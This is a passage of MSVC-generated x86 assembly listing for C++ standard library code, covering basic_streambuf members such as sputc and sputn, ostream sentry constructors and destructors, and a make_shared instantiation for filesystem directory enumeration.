  0000c	8b 48 20	 mov	 ecx, DWORD PTR [eax+32]
  0000f	83 39 00	 cmp	 DWORD PTR [ecx], 0
  00012	74 0d		 je	 SHORT $LN3@Pnavail
  00014	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00017	8b 42 30	 mov	 eax, DWORD PTR [edx+48]
  0001a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0001c	89 4d f8	 mov	 DWORD PTR tv69[ebp], ecx
  0001f	eb 07		 jmp	 SHORT $LN4@Pnavail
$LN3@Pnavail:
  00021	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv69[ebp], 0
$LN4@Pnavail:
  00028	8b 45 f8	 mov	 eax, DWORD PTR tv69[ebp]
  0002b	99		 cdq

; 262  :     }

  0002c	8b e5		 mov	 esp, ebp
  0002e	5d		 pop	 ebp
  0002f	c3		 ret	 0
?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ
_TEXT	SEGMENT
tv76 = -8						; size = 4
_this$ = -4						; size = 4
?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ PROC ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc, COMDAT
; _this$ = ecx

; 255  :     _Elem* __CLR_OR_THIS_CALL _Pninc() noexcept { // increment current position in write buffer

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 256  :         --*_IPcount;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 30	 mov	 ecx, DWORD PTR [eax+48]
  0000f	8b 11		 mov	 edx, DWORD PTR [ecx]
  00011	83 ea 01	 sub	 edx, 1
  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00017	8b 48 30	 mov	 ecx, DWORD PTR [eax+48]
  0001a	89 11		 mov	 DWORD PTR [ecx], edx

; 257  :         return (*_IPnext)++;

  0001c	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0001f	8b 42 20	 mov	 eax, DWORD PTR [edx+32]
  00022	8b 08		 mov	 ecx, DWORD PTR [eax]
  00024	89 4d f8	 mov	 DWORD PTR tv76[ebp], ecx
  00027	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0002a	8b 42 20	 mov	 eax, DWORD PTR [edx+32]
  0002d	8b 08		 mov	 ecx, DWORD PTR [eax]
  0002f	83 c1 01	 add	 ecx, 1
  00032	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00035	8b 42 20	 mov	 eax, DWORD PTR [edx+32]
  00038	89 08		 mov	 DWORD PTR [eax], ecx
  0003a	8b 45 f8	 mov	 eax, DWORD PTR tv76[ebp]

; 258  :     }

  0003d	8b e5		 mov	 esp, ebp
  0003f	5d		 pop	 ebp
  00040	c3		 ret	 0
?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z
_TEXT	SEGMENT
tv71 = -8						; size = 4
_this$ = -4						; size = 4
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 8
?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z PROC ; std::basic_streambuf<char,std::char_traits<char> >::sputn, COMDAT
; _this$ = ecx

; 170  :         streamsize _Count) { // put _Count characters from array beginning at _Ptr

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 171  :         return xsputn(_Ptr, _Count);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000e	8b 51 24	 mov	 edx, DWORD PTR [ecx+36]
  00011	89 55 f8	 mov	 DWORD PTR tv71[ebp], edx
  00014	8b 45 10	 mov	 eax, DWORD PTR __Count$[ebp+4]
  00017	50		 push	 eax
  00018	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0001b	51		 push	 ecx
  0001c	8b 55 08	 mov	 edx, DWORD PTR __Ptr$[ebp]
  0001f	52		 push	 edx
  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	ff 55 f8	 call	 DWORD PTR tv71[ebp]

; 172  :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c2 0c 00	 ret	 12			; 0000000cH
?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z ENDP ; std::basic_streambuf<char,std::char_traits<char> >::sputn
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z
_TEXT	SEGMENT
tv89 = -24						; size = 8
tv81 = -16						; size = 4
tv79 = -12						; size = 4
tv82 = -8						; size = 4
_this$ = -4						; size = 4
__Ch$ = 8						; size = 1
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z PROC ; std::basic_streambuf<char,std::char_traits<char> >::sputc, COMDAT
; _this$ = ecx

; 165  :     int_type __CLR_OR_THIS_CALL sputc(_Elem _Ch) { // put a character

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 166  :         return 0 < _Pnavail() ? _Traits::to_int_type(*_Pninc() = _Ch) : overflow(_Traits::to_int_type(_Ch));

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
  00011	89 45 e8	 mov	 DWORD PTR tv89[ebp], eax
  00014	89 55 ec	 mov	 DWORD PTR tv89[ebp+4], edx
  00017	83 7d ec 00	 cmp	 DWORD PTR tv89[ebp+4], 0
  0001b	7c 27		 jl	 SHORT $LN3@sputc
  0001d	7f 06		 jg	 SHORT $LN5@sputc
  0001f	83 7d e8 00	 cmp	 DWORD PTR tv89[ebp], 0
  00023	76 1f		 jbe	 SHORT $LN3@sputc
$LN5@sputc:
  00025	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00028	e8 00 00 00 00	 call	 ?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
  0002d	8a 4d 08	 mov	 cl, BYTE PTR __Ch$[ebp]
  00030	88 08		 mov	 BYTE PTR [eax], cl
  00032	0f b6 55 08	 movzx	 edx, BYTE PTR __Ch$[ebp]
  00036	52		 push	 edx
  00037	e8 00 00 00 00	 call	 ?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
  0003c	83 c4 04	 add	 esp, 4
  0003f	89 45 f8	 mov	 DWORD PTR tv82[ebp], eax
  00042	eb 28		 jmp	 SHORT $LN4@sputc
$LN3@sputc:
  00044	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00047	8b 08		 mov	 ecx, DWORD PTR [eax]
  00049	8b 51 0c	 mov	 edx, DWORD PTR [ecx+12]
  0004c	89 55 f0	 mov	 DWORD PTR tv81[ebp], edx
  0004f	0f b6 45 08	 movzx	 eax, BYTE PTR __Ch$[ebp]
  00053	50		 push	 eax
  00054	e8 00 00 00 00	 call	 ?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
  00059	83 c4 04	 add	 esp, 4
  0005c	89 45 f4	 mov	 DWORD PTR tv79[ebp], eax
  0005f	8b 4d f4	 mov	 ecx, DWORD PTR tv79[ebp]
  00062	51		 push	 ecx
  00063	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00066	ff 55 f0	 call	 DWORD PTR tv81[ebp]
  00069	89 45 f8	 mov	 DWORD PTR tv82[ebp], eax
$LN4@sputc:
  0006c	8b 45 f8	 mov	 eax, DWORD PTR tv82[ebp]

; 167  :     }

  0006f	8b e5		 mov	 esp, ebp
  00071	5d		 pop	 ebp
  00072	c2 04 00	 ret	 4
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z ENDP ; std::basic_streambuf<char,std::char_traits<char> >::sputc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ PROC ; std::basic_streambuf<char,std::char_traits<char> >::pubsync, COMDAT
; _this$ = ecx

; 120  :     int __CLR_OR_THIS_CALL pubsync() { // synchronize with external agent

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 121  :         return sync();

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 10		 mov	 edx, DWORD PTR [eax]
  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	8b 42 34	 mov	 eax, DWORD PTR [edx+52]
  00012	ff d0		 call	 eax

; 122  :     }

  00014	8b e5		 mov	 esp, ebp
  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool, COMDAT
; _this$ = ecx

; 128  :         explicit __CLR_OR_THIS_CALL operator bool() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 129  :             return _Ok;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	0f b6 40 04	 movzx	 eax, BYTE PTR [eax+4]

; 130  :         }

  0000e	8b e5		 mov	 esp, ebp
  00010	5d		 pop	 ebp
  00011	c3		 ret	 0
??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
__Zero_uncaught_exceptions$ = -2			; size = 1
tv72 = -1						; size = 1
??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry, COMDAT
; _this$ = ecx

; 113  :         __CLR_OR_THIS_CALL ~sentry() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 114  : #if !_HAS_EXCEPTIONS
; 115  :             const bool _Zero_uncaught_exceptions = true;
; 116  : #elif _HAS_DEPRECATED_UNCAUGHT_EXCEPTION
; 117  :             const bool _Zero_uncaught_exceptions = !_STD uncaught_exception(); // TRANSITION, ArchivedOS-12000909

  00009	e8 00 00 00 00	 call	 ?uncaught_exception@std@@YA_NXZ ; std::uncaught_exception
  0000e	0f b6 c0	 movzx	 eax, al
  00011	85 c0		 test	 eax, eax
  00013	75 06		 jne	 SHORT $LN4@sentry
  00015	c6 45 ff 01	 mov	 BYTE PTR tv72[ebp], 1
  00019	eb 04		 jmp	 SHORT $LN5@sentry
$LN4@sentry:
  0001b	c6 45 ff 00	 mov	 BYTE PTR tv72[ebp], 0
$LN5@sentry:
  0001f	8a 4d ff	 mov	 cl, BYTE PTR tv72[ebp]
  00022	88 4d fe	 mov	 BYTE PTR __Zero_uncaught_exceptions$[ebp], cl

; 118  : #else // ^^^ _HAS_DEPRECATED_UNCAUGHT_EXCEPTION / !_HAS_DEPRECATED_UNCAUGHT_EXCEPTION vvv
; 119  :             const bool _Zero_uncaught_exceptions = _STD uncaught_exceptions() == 0;
; 120  : #endif // ^^^ !_HAS_DEPRECATED_UNCAUGHT_EXCEPTION ^^^
; 121  : 
; 122  :             if (_Zero_uncaught_exceptions) {

  00025	0f b6 55 fe	 movzx	 edx, BYTE PTR __Zero_uncaught_exceptions$[ebp]
  00029	85 d2		 test	 edx, edx
  0002b	74 0a		 je	 SHORT $LN2@sentry

; 123  :                 this->_Myostr._Osfx();

  0002d	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00030	8b 08		 mov	 ecx, DWORD PTR [eax]
  00032	e8 00 00 00 00	 call	 ?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
$LN2@sentry:

; 124  :             }
; 125  :         }

  00037	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0003a	e8 00 00 00 00	 call	 ??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
  0003f	8b e5		 mov	 esp, ebp
  00041	5d		 pop	 ebp
  00042	c3		 ret	 0
??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z
_TEXT	SEGMENT
__Tied$ = -8						; size = 4
_this$ = -4						; size = 4
__Ostr$ = 8						; size = 4
??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry, COMDAT
; _this$ = ecx

; 96   :         explicit __CLR_OR_THIS_CALL sentry(basic_ostream& _Ostr) : _Sentry_base(_Ostr) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00010	e8 00 00 00 00	 call	 ??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base

; 97   :             if (!_Ostr.good()) {

  00015	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  00018	8b 11		 mov	 edx, DWORD PTR [ecx]
  0001a	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0001d	03 4a 04	 add	 ecx, DWORD PTR [edx+4]
  00020	e8 00 00 00 00	 call	 ?good@ios_base@std@@QBE_NXZ ; std::ios_base::good
  00025	0f b6 c0	 movzx	 eax, al
  00028	85 c0		 test	 eax, eax
  0002a	75 09		 jne	 SHORT $LN2@sentry

; 98   :                 _Ok = false;

  0002c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002f	c6 41 04 00	 mov	 BYTE PTR [ecx+4], 0

; 99   :                 return;

  00033	eb 4a		 jmp	 SHORT $LN1@sentry
$LN2@sentry:

; 100  :             }
; 101  : 
; 102  :             const auto _Tied = _Ostr.tie();

  00035	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  00038	8b 02		 mov	 eax, DWORD PTR [edx]
  0003a	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0003d	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  00040	e8 00 00 00 00	 call	 ?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::tie
  00045	89 45 f8	 mov	 DWORD PTR __Tied$[ebp], eax

; 103  :             if (!_Tied || _Tied == &_Ostr) {

  00048	83 7d f8 00	 cmp	 DWORD PTR __Tied$[ebp], 0
  0004c	74 08		 je	 SHORT $LN4@sentry
  0004e	8b 4d f8	 mov	 ecx, DWORD PTR __Tied$[ebp]
  00051	3b 4d 08	 cmp	 ecx, DWORD PTR __Ostr$[ebp]
  00054	75 09		 jne	 SHORT $LN3@sentry
$LN4@sentry:

; 104  :                 _Ok = true;

  00056	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00059	c6 42 04 01	 mov	 BYTE PTR [edx+4], 1

; 105  :                 return;

  0005d	eb 20		 jmp	 SHORT $LN1@sentry
$LN3@sentry:

; 106  :             }
; 107  : 
; 108  :             _Tied->flush();

  0005f	8b 4d f8	 mov	 ecx, DWORD PTR __Tied$[ebp]
  00062	e8 00 00 00 00	 call	 ?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush

; 109  :             _Ok = _Ostr.good(); // store test only after flushing tie

  00067	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  0006a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0006c	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  0006f	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  00072	8b ca		 mov	 ecx, edx
  00074	e8 00 00 00 00	 call	 ?good@ios_base@std@@QBE_NXZ ; std::ios_base::good
  00079	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0007c	88 41 04	 mov	 BYTE PTR [ecx+4], al
$LN1@sentry:

; 110  :         }

  0007f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00082	8b e5		 mov	 esp, ebp
  00084	5d		 pop	 ebp
  00085	c2 04 00	 ret	 4
??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -12						; size = 4
tv72 = -8						; size = 4
__Rdbuf$ = -4						; size = 4
??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base, COMDAT
; _this$ = ecx

; 82   :         __CLR_OR_THIS_CALL ~_Sentry_base() noexcept { // destroy after unlocking

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 83   :             const auto _Rdbuf = _Myostr.rdbuf();

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000e	89 4d f8	 mov	 DWORD PTR tv72[ebp], ecx
  00011	8b 55 f8	 mov	 edx, DWORD PTR tv72[ebp]
  00014	8b 02		 mov	 eax, DWORD PTR [edx]
  00016	8b 4d f8	 mov	 ecx, DWORD PTR tv72[ebp]
  00019	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  0001c	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  00021	89 45 fc	 mov	 DWORD PTR __Rdbuf$[ebp], eax

; 84   :             if (_Rdbuf) {

  00024	83 7d fc 00	 cmp	 DWORD PTR __Rdbuf$[ebp], 0
  00028	74 0d		 je	 SHORT $LN2@Sentry_bas

; 85   :                 _Rdbuf->_Unlock();

  0002a	8b 4d fc	 mov	 ecx, DWORD PTR __Rdbuf$[ebp]
  0002d	8b 11		 mov	 edx, DWORD PTR [ecx]
  0002f	8b 4d fc	 mov	 ecx, DWORD PTR __Rdbuf$[ebp]
  00032	8b 42 08	 mov	 eax, DWORD PTR [edx+8]
  00035	ff d0		 call	 eax
$LN2@Sentry_bas:

; 86   :             }
; 87   :         }

  00037	8b e5		 mov	 esp, ebp
  00039	5d		 pop	 ebp
  0003a	c3		 ret	 0
??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z
_TEXT	SEGMENT
tv73 = -12						; size = 4
_this$ = -8						; size = 4
__Rdbuf$ = -4						; size = 4
__Ostr$ = 8						; size = 4
??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base, COMDAT
; _this$ = ecx

; 75   :         __CLR_OR_THIS_CALL _Sentry_base(basic_ostream& _Ostr) : _Myostr(_Ostr) { // lock the stream buffer, if there

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0000f	89 08		 mov	 DWORD PTR [eax], ecx

; 76   :             const auto _Rdbuf = _Myostr.rdbuf();

  00011	8b 55 f8	 mov	 edx, DWORD PTR _this$[ebp]
  00014	8b 02		 mov	 eax, DWORD PTR [edx]
  00016	89 45 f4	 mov	 DWORD PTR tv73[ebp], eax
  00019	8b 4d f4	 mov	 ecx, DWORD PTR tv73[ebp]
  0001c	8b 11		 mov	 edx, DWORD PTR [ecx]
  0001e	8b 4d f4	 mov	 ecx, DWORD PTR tv73[ebp]
  00021	03 4a 04	 add	 ecx, DWORD PTR [edx+4]
  00024	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  00029	89 45 fc	 mov	 DWORD PTR __Rdbuf$[ebp], eax

; 77   :             if (_Rdbuf) {

  0002c	83 7d fc 00	 cmp	 DWORD PTR __Rdbuf$[ebp], 0
  00030	74 0d		 je	 SHORT $LN2@Sentry_bas

; 78   :                 _Rdbuf->_Lock();

  00032	8b 45 fc	 mov	 eax, DWORD PTR __Rdbuf$[ebp]
  00035	8b 10		 mov	 edx, DWORD PTR [eax]
  00037	8b 4d fc	 mov	 ecx, DWORD PTR __Rdbuf$[ebp]
  0003a	8b 42 04	 mov	 eax, DWORD PTR [edx+4]
  0003d	ff d0		 call	 eax
$LN2@Sentry_bas:

; 79   :             }
; 80   :         }

  0003f	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00042	8b e5		 mov	 esp, ebp
  00044	5d		 pop	 ebp
  00045	c2 04 00	 ret	 4
??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$make_shared@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YA?AV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@$$QAU_Creator@_Dir_enum_impl@filesystem@0@ABW4directory_options@40@@Z
_TEXT	SEGMENT
__Ret$ = -28						; size = 8
tv79 = -20						; size = 4
tv81 = -16						; size = 4
__Rx$ = -12						; size = 4
tv82 = -8						; size = 4
$T1 = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
_<_Args_0>$ = 12					; size = 4
_<_Args_1>$ = 16					; size = 4
??$make_shared@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YA?AV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@$$QAU_Creator@_Dir_enum_impl@filesystem@0@ABW4directory_options@40@@Z PROC ; std::make_shared<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>, COMDAT

; 2737 :     make_shared(_Types&&... _Args) { // make a shared_ptr to non-array object

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH

; 2738 :     const auto _Rx = new _Ref_count_obj2<_Ty>(_STD forward<_Types>(_Args)...);

  00006	6a 50		 push	 80			; 00000050H
  00008	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  0000d	83 c4 04	 add	 esp, 4
  00010	89 45 fc	 mov	 DWORD PTR $T1[ebp], eax
  00013	83 7d fc 00	 cmp	 DWORD PTR $T1[ebp], 0
  00017	74 33		 je	 SHORT $LN3@make_share
  00019	8b 45 10	 mov	 eax, DWORD PTR _<_Args_1>$[ebp]
  0001c	50		 push	 eax
  0001d	e8 00 00 00 00	 call	 ??$forward@ABW4directory_options@filesystem@std@@@std@@YAABW4directory_options@filesystem@0@ABW4120@@Z ; std::forward<enum std::filesystem::directory_options const &>
  00022	83 c4 04	 add	 esp, 4
  00025	89 45 f0	 mov	 DWORD PTR tv81[ebp], eax
  00028	8b 4d 0c	 mov	 ecx, DWORD PTR _<_Args_0>$[ebp]
  0002b	51		 push	 ecx
  0002c	e8 00 00 00 00	 call	 ??$forward@U_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ; std::forward<std::filesystem::_Dir_enum_impl::_Creator>
  00031	83 c4 04	 add	 esp, 4
  00034	89 45 ec	 mov	 DWORD PTR tv79[ebp], eax
  00037	8b 55 f0	 mov	 edx, DWORD PTR tv81[ebp]
  0003a	52		 push	 edx
  0003b	8b 45 ec	 mov	 eax, DWORD PTR tv79[ebp]
  0003e	50		 push	 eax
  0003f	8b 4d fc	 mov	 ecx, DWORD PTR $T1[ebp]
  00042	e8 00 00 00 00	 call	 ??$?0U_Creator@_Dir_enum_impl@filesystem@std@@ABW4directory_options@23@@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAU_Creator@_Dir_enum_impl@filesystem@1@ABW4directory_options@41@@Z ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Ref_count_obj2<std::filesystem::_Dir_enum_impl><std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
  00047	89 45 f8	 mov	 DWORD PTR tv82[ebp], eax
  0004a	eb 07		 jmp	 SHORT $LN4@make_share
$LN3@make_share:
  0004c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv82[ebp], 0
$LN4@make_share:
  00053	8b 4d f8	 mov	 ecx, DWORD PTR tv82[ebp]
  00056	89 4d f4	 mov	 DWORD PTR __Rx$[ebp], ecx

; 2739 :     shared_ptr<_Ty> _Ret;

  00059	8d 4d e4	 lea	 ecx, DWORD PTR __Ret$[ebp]
  0005c	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>

; 2740 :     _Ret._Set_ptr_rep_and_enable_shared(_STD addressof(_Rx->_Storage._Value), _Rx);

